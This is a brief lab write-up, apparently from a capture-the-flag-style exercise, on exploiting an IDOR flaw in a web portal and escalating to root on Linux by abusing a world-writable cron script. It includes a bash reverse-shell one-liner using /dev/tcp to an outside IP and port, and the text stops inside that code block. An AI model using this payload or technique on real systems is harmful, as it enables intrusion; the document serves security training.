# Web Application Security & Linux Exploitation

## 🎯 Lab Objective
To identify, exploit, and remediate critical web vulnerabilities found within the OWASP Top 10 framework, followed by local Linux privilege escalation.

## 🛠️ Tools Used
* Burp Suite (Proxy, Repeater, Intruder)
* Gobuster / Dirbuster
* SQLmap (for verification)
* LinPEAS (Linux Privilege Escalation Awesome Script)

## 🔍 Vulnerability Breakdown & PoC

### 1. Insecure Direct Object Reference (IDOR)
* **Discovery:** While analyzing the user account portal, the URL structure was observed using sequential numeric identifiers: `https://target.thm/profile?id=1001`.
* **Exploitation:** By sending the request to **Burp Suite Repeater** and modifying the `id` parameter to `1002`, the server returned the private profile data of a different user without authentication validation.
* **Remediation:** Implement strict, server-side Access Control Checks using cryptographically secure, non-sequential UUIDs (e.g., `/profile?id=f81d4fae-7dec-11d0-a765-00a0c91e6bf6`).

### 2. Linux Local Privilege Escalation (Cron Job Abuse)
* **Enumeration:** Running `cat /etc/crontab` revealed a custom cleanup script running as `root` every 5 minutes: `/opt/scripts/cleanup.sh`.
* **Exploitation:** The file permissions on `cleanup.sh` were misconfigured, allowing write access to low-privilege users (`-rwxrwxrwx`). A bash reverse shell payload was appended to the script:
  ```bash
  bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
